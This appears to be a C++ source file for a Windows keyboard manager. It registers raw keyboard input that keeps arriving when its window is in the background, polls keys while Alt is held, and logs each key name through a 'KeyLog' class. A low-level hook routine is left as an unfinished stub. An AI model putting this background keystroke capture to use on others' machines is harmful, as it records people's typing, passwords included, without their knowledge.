#include "KeyboardManager.h"
#include "LogManager.h"
#include "Tools.h"

void KeyboardManager::Start()
{
	InitRaw();
}
void KeyboardManager::Update()
{
	//在按下alt时，使用update捕获事件，因为alt后不会发送WM_INPUT
	if (Tools::Alt())
	{
		for (USHORT ch = 1; ch < 250; ch++)
		{
			if (ch == VK_LBUTTON || ch == VK_RBUTTON)
			{
				continue;
			}
			if (ch == VK_SHIFT || ch == VK_LSHIFT || ch == VK_RSHIFT)
			{
				continue;
			}
			if (ch == VK_CONTROL || ch == VK_LCONTROL || ch == VK_RCONTROL)
			{
				continue;
			}
			if (ch == VK_MENU || ch == VK_LMENU || ch == VK_RMENU)
			{
				continue;
			}
			if (GetAsyncKeyState(ch) == -32767)
			{
				HandleMsg(ch);
			}
		}
	}
}
void KeyboardManager::HandleMsg(const MSG& rMsg)
{
	unsigned int vkCode = rMsg.wParam;
	if (vkCode == VK_SHIFT || vkCode == VK_CONTROL || vkCode == VK_MENU)
	{
		return;
	}
	HandleMsg(vkCode);
}
void KeyboardManager::HandleMsg(USHORT vCode)
{
	KeyLog::LogEvent(EVENT_TYPE::EVENT_KEY_DOWN, Tools::GetKeyName(vCode));
}
void KeyboardManager::OnDestroy()
{

}
void KeyboardManager::InitRaw()
{
	RAWINPUTDEVICE rid;
	rid.usUsagePage = 0x01;
	rid.usUsage = 0x06;
	rid.dwFlags = RIDEV_INPUTSINK;
	rid.hwndTarget = GlobalData::hWindow;
	bool ret = RegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE));
	if (ret)
	{
		KeyLog::Log("KeyboardManager RegisterRawInputDevices Sec!\n");
	}
	else
	{
		KeyLog::Log("KeyboardManager RegisterRawInputDevices Fail! Error = " + to_string(GetLastError()));
	}
}

void KeyboardManager::InitHook()
{
	mHook = SetWindowsHookEx(WH_KEYBOARD_LL, NULL, NULL, 0);
}
LRESULT CALLBACK KeyboardManager::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	char key_value[32] = { 0 };
	if (nCode >= 0)
	{
		//键盘消息
		if (wParam == WM_KEYDOWN)
		{
		}
	}
	return CallNextHookEx(mHook, nCode, wParam, lParam);
}
void KeyboardManager::DestroyHook()
{
	UnhookWindowsHookEx(mHook);
}
